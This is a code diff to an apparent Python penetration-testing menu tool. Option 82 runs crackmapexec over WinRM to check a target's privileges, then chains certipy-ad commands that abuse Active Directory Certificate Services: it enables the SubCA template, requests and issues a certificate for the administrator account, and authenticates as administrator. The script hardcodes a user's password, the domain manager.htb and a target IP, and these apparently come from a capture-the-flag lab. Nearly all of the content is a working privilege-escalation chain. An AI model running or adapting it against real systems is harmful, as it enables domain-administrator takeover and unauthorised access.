@@ -3347,18 +3347,19 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='82':
-      remoteCOM("crackmnapexec smb " + TIP.rstrip(" ") + " -d " + DOM.strip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -x whoam /all > priv.tmp")
-      catsfile(priv.tmp)
-      file = open("priv.tmp")
-      if ("SeMachineAccountPrivilege" == file):
-        localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven -ca 'manager-DC01-CA'")
-        localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -enable-template 'SubCA'")
-        localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template SubCA -upn administrator@manager.htb -target manager.htb")
-        localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -issue-request 45")
-        localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 45")
-        localCOM("certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 -domain manager.htb -username administrator")
-      else:
-         pass
+      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /all' > priv.tmp")
+      catsFile("priv.tmp")
+      with open("priv.tmp") as file:
+         contents = file.read()
+         if "SeMachineAccountPrivilege" in contents:      
+            localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven -ca 'manager-DC01-CA'")
+            localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -enable-template 'SubCA'")
+            localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template SubCA -upn administrator@manager.htb -target manager.htb")
+            localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -issue-request 45")
+            localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 45")
+            localCOM("certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 -domain manager.htb -username administrator")
+         else:
+            pass
       prompt() 
  
 # ------------------------------------------------------------------------------------- 
